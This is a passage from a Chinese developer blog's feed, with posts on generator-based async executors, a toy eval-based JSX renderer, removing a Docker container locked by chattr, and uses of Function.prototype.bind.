async/await。</p><p>前面说过，异步可以被理解成是一种在两个顺序流程之间切换并传递信息的运行模式，那么如果把这个思想落实到 Generator 上就可以发现，yield 关键字既可以让流程从 Generator 中切换到外部执行流，又可以携带特定的信息；next 方法在另一方面使得流程回到 Generator 中成为可能。</p><p>于是，通过观察前面 CallBack 和 Promise 阅读文件的例子，就可以发现其具备特定的规律，从而结合 Generator 写出如下的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// callback + generator 的例子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Thunkify</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">argExceptCb</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">argIncludeCb</span> (<span class="params">cb</span>) </span>&#123;</span><br><span class="line">      fn.call(fn, ...args, cb)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> readFile = Thunkify(fs.readFile)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">readFiles</span> (<span class="params">...filenames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (fn <span class="keyword">of</span> filenames) &#123;</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">yield</span> readFile(fn)</span><br><span class="line">    <span class="built_in">console</span>.log(content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runThunkifyGen</span> (<span class="params">gen</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = gen.next(data)    </span><br><span class="line">    <span class="keyword">if</span> (ret.done) <span class="keyword">return</span></span><br><span class="line">    ret.value(next)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runThunkifyGen(readFiles(<span class="string">'file1'</span>, <span class="string">'file2'</span>, <span class="string">'file3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Read done'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// promise + generator 的例子</span></span><br><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autorun</span> (<span class="params">gen</span>) </span>&#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = gen.next(data)</span><br><span class="line">    <span class="keyword">if</span> (ret.done) <span class="keyword">return</span></span><br><span class="line">    ret.value.then(<span class="function"><span class="params">data</span> =&gt;</span> next(data.toString()))</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">readFiles</span> (<span class="params">...filenames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (fn <span class="keyword">of</span> filenames) &#123;</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">yield</span> readFile(fn)</span><br><span class="line">    <span class="built_in">console</span>.log(content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">autorun(readFiles(<span class="string">'file1'</span>, <span class="string">'file2'</span>, <span class="string">'file3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Read done"</span>)</span><br></pre></td></tr></table></figure><p>例子中的 autorun 和 runThunkifyGen 函数被称为 <strong>执行器</strong>，用于自动将流程在 Generator 和调用方之间切换，并保证读取的文件顺序。</p><p>可以看到，实际上执行器就是提取出了 callback 和 then 的部分，在这里用户需要关注的只有 readFiles 这一个函数，而两个例子中，readFiles 长得一模一样。</p><p>那么如果我们把目光着眼于更一般的场景，是否可以结合 Generator 和执行器来让其达到普适呢？答案是可以的，下面给出代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step</span> (<span class="params">gen, data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> next = gen.next(data)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next.done</span><br><span class="line">      ? <span class="built_in">Promise</span>.resolve(next.value)</span><br><span class="line">      : <span class="built_in">Promise</span>.resolve(next.value)</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> step(gen, data))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> gen = fn()</span><br><span class="line"><span class="keyword">return</span> step(gen)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>async 函数接受一个 Generator，然后返回一个新的函数，这个函数在内部递归调用 step，这个 step 其实就是执行器（其实可以通过 IIFE 使得 step 变成单例，不过这里就不考虑这些了）。</p><p>和上面不同的地方在于，前面的两个都分别假定了 yield 后面跟随的要么是一个 thunk，要么是一个promise，而 async 则支持 yield 后面跟随一般值，能做到这一点的原因在于 Promise.resolve 和 Promise.reject ，其具体的机制可以查看MDN。</p><p>那么该如何使用 async 呢，继续回到之前按顺序打开并读取文件的例子，我们的代码会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises </span><br><span class="line"><span class="keyword">const</span> func1 = <span class="keyword">async</span>(<span class="function"><span class="keyword">function</span> *(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> data1 = <span class="keyword">yield</span> readFile(<span class="string">'file1'</span>)</span><br><span class="line"><span class="keyword">const</span> data2 = <span class="keyword">yield</span> readFile(<span class="string">'file2'</span>)</span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">yield</span> readFile(<span class="string">'file3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data1:'</span>, data1.toString())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data2:'</span>, data2.toString())</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data3:'</span>, data3.toString())</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>已经对 async/await 有所了解的小伙伴可以发现，同样的逻辑，如果使用这一对新人，则代码会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"><span class="keyword">const</span> func2 = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> data1 = <span class="keyword">await</span> readFile(<span class="string">'file1'</span>)</span><br><span class="line"><span class="keyword">const</span> data2 = <span class="keyword">await</span> readFile(<span class="string">'file2'</span>)</span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">await</span> readFile(<span class="string">'file3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data1:'</span>, data1.toString())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data2:'</span>, data2.toString())</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data3:'</span>, data3.toString())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很相似，对吧？</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一个关于 script 标签的 type 属性的另类用法</title>
      <link href="/2020/09/25/ScriptType/"/>
      <url>/2020/09/25/ScriptType/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天出于好奇跑去 React 官网转了一圈，看到里面提供了一个 <a href="https://raw.githubusercontent.com/reactjs/reactjs.org/master/static/html/single-file-example.html" target="_blank" rel="noopener">无需构建工具</a> 的体验例子，看到代码后感觉很神奇，因为它直接在 script 里的 render 函数中写入了 JSX ，并且成功渲染到了视图里，但是这种语法显然不是被允许的，红色的 <code>Uncaught SyntaxError: expected expression, got &#39;&lt;&#39;</code> 是应该出现在 console 中的。</p><h1 id="0x01-原理及实现"><a href="#0x01-原理及实现" class="headerlink" title="0x01 原理及实现"></a>0x01 原理及实现</h1><p>思来想去，突然发现 script 中的 type 标签里并不是常规的 text/javascript ，而是非标准的 text/babel ，那么这个东西有什么影响呢？</p><p>其实把这段代码复制到一个带语法高亮的编辑器中应该就能看到异样了，比如扔进我本地使用的 vscode 时就可以发现，script 标签中并没有提供语法高亮和代码补全功能。</p><p>STFW 后得知，对于这种 type ，浏览器不会将其看作将被执行的 script ，而是当作普通的标签元素来看待，而既然这里的 type 是 babel，上面的 script:src 也引入了 babel ，那么想来编译并执行这段纯文本就是它的工作了。</p><p>知道了这个原理后，就可以写出简单的渲染方法了，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML 文件 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Render-Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"render.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/react"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"Output msg to console"</span>)</span></span><br><span class="line"></span><br><span class="line">    render(</span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, React!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">spanInputBox</span>&lt;/<span class="attr">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"alert('Hello!')"</span>&gt;</span>clickMe<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>,</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'app'</span>)</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>render.js 文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> pattern = <span class="regexp">/\s*render\s*\(\s*(&lt;.+&gt;)/g</span>s</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> scriptList = <span class="built_in">document</span>.querySelectorAll(<span class="string">'script[type="text/react"]'</span>)</span><br><span class="line"></span><br><span class="line">  globalThis.render = <span class="function"><span class="keyword">function</span> (<span class="params">template, node</span>) </span>&#123;</span><br><span class="line">    node.innerHTML = template</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> script <span class="keyword">of</span> scriptList) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(script.textContent.replaceAll(</span><br><span class="line">      pattern,</span><br><span class="line">      (_, template) =&gt; <span class="string">`;render(\`<span class="subst">$&#123;template&#125;</span>\``</span>       </span><br><span class="line">    ))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概思路就是找到所有 type 相符的 script 标签，给 jsx 的部分加上引号，然后把整坨内容扔进 eval 里跑一下，当然现实中肯定不会这么简单粗暴，这里只能说是一个 POC 吧。</p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>没什么总结的，就是闲着没事水了一篇博客而已（</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>测试 Github Actions</title>
      <link href="/2020/09/03/GitActionsTest/"/>
      <url>/2020/09/03/GitActionsTest/</url>
      
        <content type="html"><![CDATA[<p>Congratulations to myself :-)</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次手贱的经历与解决办法</title>
      <link href="/2020/09/01/Docker-Chattr/"/>
      <url>/2020/09/01/Docker-Chattr/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-起因"><a href="#0x0-起因" class="headerlink" title="0x0 起因"></a>0x0 起因</h1><p>一直以来对 Linux 的权限管理都仅仅停留在 “知道有这种机制存在” 的程度上，最近为某比赛出题时因为要有 getshell 的环境，所以就趁机了解了一下其中的一些理论和对应的命令。</p><p>由于我本人平时使用的是 MacOS 系统，再加上赛题环境也要扔到 docker 中，所以在学习权限管理时在 docker 里开了一个容器作为环境，测试的命令包括 chown，chroot，lsattr，chattr… 等等（这里插一句题外话，为了在容器中运行 chattr ，需要在启动时加上 <code>--cap-add LINUX_IMMUTABLE</code> 参数来为其赋予一个 capability ），在了解到可以开始创建赛题环境的程度后，我退出了容器，并运行了 <code>docker rm ...</code> 来将测试用的容器删除掉。</p><p>正当我准备开始输入命令创建新的容器时，却看到 docker 并没有正常删除测试用容器，取而代之地返回了一条蜜汁信息（这里省略了容器对应的两个哈希，该哈希对应我上文提到的那个用于测试权限管理的容器）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: container ...: driver "overlay2" failed to remove root filesystem: unlinkat /var/lib/docker/overlay2/.../diff/test/file: operation not permitted</span><br></pre></td></tr></table></figure><p>可以看到，大意是 docker 没有权限删除容器中的 /test/file 文件，比较幸运地，我记得这个文件是经历了 <code>chattr +a file</code> 处理后的文件，这个隐藏属性使得文件只可被追加新的内容而不可被删除或者修改。</p><p>起初我觉得这个问题很好解决（实际也很好解决，只不过和我开始想的不同），如果是在 docker for linux 上，直接在宿主机切到对应的目录后运行 <code>chattr -a file</code> 去掉隐藏属性，然后继续运行 <code>docker rm ...</code> 删掉容器即可；docker for macos 无非就是多了一层 HyperKit，可以用 screen 进入到 vm 中（我本机上是 <code>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code>），然后进行和上文相同的操作。</p><p>然而进去才发现，这个 vm 提供的命令太少了，根本没有 chattr 命令可用，尝试搜索是否有等效的命令可用也没有搜到，更没有人手贱到和我一样，所以现在的场景也没有先人的经验可以学习。虽然这一个容器本身并没有占多大的空间，但是强迫症使然，我还是想把它删除掉:-P</p><h1 id="0x1-解决办法"><a href="#0x1-解决办法" class="headerlink" title="0x1 解决办法"></a>0x1 解决办法</h1><h2 id="0x10-Hard-Reset"><a href="#0x10-Hard-Reset" class="headerlink" title="0x10 Hard Reset"></a>0x10 Hard Reset</h2><p>最初我尝试自己在 StackOverflow 上提出了这一问题，然而也不知道是因为环境描述的不到位还是因为自己小学水平的英文写作能力，下面的答复甚至都没有对应到这个问题上…</p><p>只有一位老哥给了还算靠谱的答复，他建议我强制重置 docker desktop for mac 的状态（Troubleshoot/Reset disk image 或者 Troubleshoot/Reset to factory defaults），这俩都会清空当前的所有的镜像和容器，后者还会顺手把应用重置成刚被安装后的状态。</p><p>确实是一个解决办法，不过因为我平时都是把 docker 当虚拟机用的，所以本机上存着各种镜像，其中还包括好多自定制的，一个一个导出来实在是太过麻烦，而我又不怎么了解这些镜像是怎么个存储机制，胡乱备份的话还担心弄出别的问题，所以就放弃了这个办法。</p><h2 id="0x11-Chroot"><a href="#0x11-Chroot" class="headerlink" title="0x11 Chroot"></a>0x11 Chroot</h2><p>在 vm 里畅游了一阵子后，我偶然发现这货还是有 chroot 可以用的，于是随便切到一个包含根目录的容器层里（我本机的路径是 <code>/var/lib/docker/overlay2/.../diff</code> ，这里依然省略了哈希），试着执行了一下 <code>chroot . /bin/bash</code> ，虽然给了一条 <code>groups: cannot find name for group ID 11</code> 的奇怪信息，不过还是顺利地进入到了 bash 环境中，而且测试了一下后发现 chattr 命令可用。</p><p>这样的话就好办多了，<strong>在无法删除的文件所在的文件夹或父文件夹中构建出 chattr 的运行环境，然后利用 chroot 运行 <code>chattr -a file</code> 来删除文件的隐藏属性，再在宿主机中运行 <code>docker rm ...</code> 即可</strong></p><p>在其他容器中（下文用 other 来指代）用 ldd 查看下 chattr 依赖的动态链接库，得到结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@docker-desktop:/# ldd $(which chattr)</span><br><span class="line">        linux-vdso.so.1 (0x00007ffebb9fc000)</span><br><span class="line">        libe2p.so.2 =&gt; /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f6ce8b0a000)</span><br><span class="line">        libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f6ce8906000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ce8515000)</span><br><span class="line">        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6ce82f6000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f6ce8f17000)</span><br></pre></td></tr></table></figure><p>可以看到依赖库都在 /lib/x86_64-linux-gnu/ 和 /lib64/ 文件夹中，所以在目标文件夹（这里指无法删除的文件 file 所在的文件夹）中用 <code>cp -R</code> 把 other 中这两个文件夹中的内容拷贝过来，再把 chattr 的 ELF 文件拷到目标文件夹中，最后在目标文件夹中运行 <code>chroot . ./chattr -a file</code> 即可。</p><p>删除了隐藏属性后，切回到宿主机中，然后运行 <code>docker rm ...</code> 就可以顺利删除掉这个出了问题的容器了。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF练习集</title>
      <link href="/2020/08/04/CTF-Exercises/"/>
      <url>/2020/08/04/CTF-Exercises/</url>
      
        <content type="html"><![CDATA[<script>window.location = "https://www.cnblogs.com/yuren123/"</script><p>如果看到这段话，说明自动跳转没有作用，请访问<a href="https://www.cnblogs.com/yuren123/" target="_blank" rel="noopener">链接</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数 Function.prototype.bind 的几个场景</title>
      <link href="/2020/08/04/FunctionBind/"/>
      <url>/2020/08/04/FunctionBind/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>一直以来都没想到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind" target="_blank" rel="noopener">bind</a> 函数的具体应用场景，最近读某源码时偶然在一个类声明中看到了下面第一个场景中的代码，由此联想到了一些其他内容，这里记录一下</p><h1 id="0x1-第一个场景"><a href="#0x1-第一个场景" class="headerlink" title="0x1 第一个场景"></a>0x1 第一个场景</h1><p>相关的核心代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类名为 Directive</span></span><br><span class="line"><span class="keyword">this</span>._update = <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.update(val) <span class="comment">//该方法同样被定义在该类中，用于更新属性，这里因篇幅原因不给出</span></span><br><span class="line">&#125;.bind(<span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><p>该方法在这个类之后的代码中被作为回调函数传给了另一个 Watcher 对象，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> watcher = <span class="keyword">this</span>._watcher = <span class="keyword">new</span> Watcher(..., <span class="keyword">this</span>._update)</span><br></pre></td></tr></table></figure><p>这个 Watcher 对象<strong>将 _update 函数作为一个属性保存在了自己的作用域</strong>中，并在用户触发相应的事件后执行回调。</p><p>这个场景下的本意是 Watcher 在监测到事件发生后调用 Directive._update 方法来更新对应的 Directive 实例中的属性，然而我们知道，Javascript 中的 this 是会根据上下文进行变化的（这里不考虑箭头函数等特殊情况），当 Watcher 把 _update 作为自己的属性时，这个 this 就从 Directive 变成 Watcher 了，之后的更新也都会发生在 Watcher 中，这显然偏离了本意。</p><p>而 bind 的作用在于，它强制绑定了代码中 this 的值，使这个函数在赋值给其他对象作为属性且通过该对象进行调用时依然以 bind 中的参数作为 this ，在这里就达到了场景本身的需求。</p><h1 id="0x2-第二个场景"><a href="#0x2-第二个场景" class="headerlink" title="0x2 第二个场景"></a>0x2 第二个场景</h1><p>上面的例子并不是一个经常会遇到的场景，下面给出一个更普遍一些的情况：假设我们在视图中有一系列按钮通过绑定事件来操作一个 Object 中的属性，由于在 js 的逻辑中也有可能用到同样的属性操作，所以这些操作可以作为该对象的方法，然后将该方法作为回调函数传给对应的 Listener ，代码大概如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这段代码因为没有具体上下文所以可能显得有些刻意，不过足够说明问题本身了</span></span><br><span class="line"><span class="keyword">let</span> runTime = <span class="keyword">new</span> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.data = <span class="number">0</span></span><br><span class="line">  <span class="keyword">this</span>.addData = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'#btn-addData'</span>);</span><br><span class="line">btn.onclick = runTime.addData;</span><br></pre></td></tr></table></figure><p>这里试图在点击一个按钮后将 runTime.data 自增，在将回调函数绑定到 click 事件时使用了 <code>btn.onclick = runTime.addData</code> 这样的语句，然而需要注意的是，在绑定后，addData 中的 this 就不再是 runTime ，而是 btn 了，这样在点击后就会尝试递增 btn.data ，从而偏离了本意。</p><p>正确的做法和前面的例子一样，应该在 addData 的函数定义后加入 <code>.bind(this)</code> 语句，从而将 this 强制绑定为 runTime 对象。</p><h1 id="0x3-第三个场景"><a href="#0x3-第三个场景" class="headerlink" title="0x3 第三个场景"></a>0x3 第三个场景</h1><p>另外上面给出的 MDN 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/b" target="_blank" rel="noopener">链接</a>中也有几个场景，不过我认为其中受用面最大的应该是 “快捷调用” 的场景，这里为了查阅方便来转述一下</p><p>场景的意图在于给经常调用的长对象方法提供一个捷径，比如想通过 Array.prototype.slice 来将一个类数组对象转换为真正的数组时，常规写法可能是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Array</span>.prototype.slice</span><br><span class="line">...</span><br><span class="line">slice.apply(<span class="built_in">arguments</span>)</span><br></pre></td></tr></table></figure><p>但是当这个函数需要经常被调用时，slice.apply 的写法还是有些令人厌烦，这时可以利用 bind 来将 apply 的 